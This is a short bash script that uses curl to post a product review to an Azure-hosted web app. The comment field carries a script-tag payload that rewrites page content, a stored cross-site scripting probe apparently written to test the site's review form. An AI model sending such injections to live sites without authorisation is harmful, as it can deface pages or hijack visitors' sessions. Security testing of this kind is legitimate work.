#!/bin/bash

comment="<script>document.getElementsByClassName('content')[0].innerText = 'something'; </script>"
#comment="test comment"

curl -X POST https://naturalflowersas.azurewebsites.net/review \
-H 'Content-Type: application/json' \
-d '{ 
    "comment": "'"$comment"'",
    "rating": 5,
    "userId": "24b39d28-11b2-4600-964b-f83bb9965aad",
    "itemId": 1
}'
